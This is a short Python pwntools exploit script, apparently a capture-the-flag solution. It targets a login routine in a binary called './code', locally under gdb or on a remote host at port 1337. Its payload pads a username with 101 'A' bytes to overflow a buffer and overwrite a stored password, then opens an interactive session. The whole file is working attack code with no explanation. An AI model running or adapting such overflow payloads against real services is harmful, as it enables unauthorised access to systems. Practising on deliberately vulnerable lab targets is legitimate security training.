#!/usr/bin/env python3

from pwn import *

gdb_script = '''
b *main+45
b *login+308
b *login+334
c
'''

exe = ELF("./code")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("10.10.254.85", 1337)

    return r


def main():
    r = conn()
    
    payload = b"bytereaper\x00" + b"A" * 101 + b"5up3rP4zz123Byte\x00"

	
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
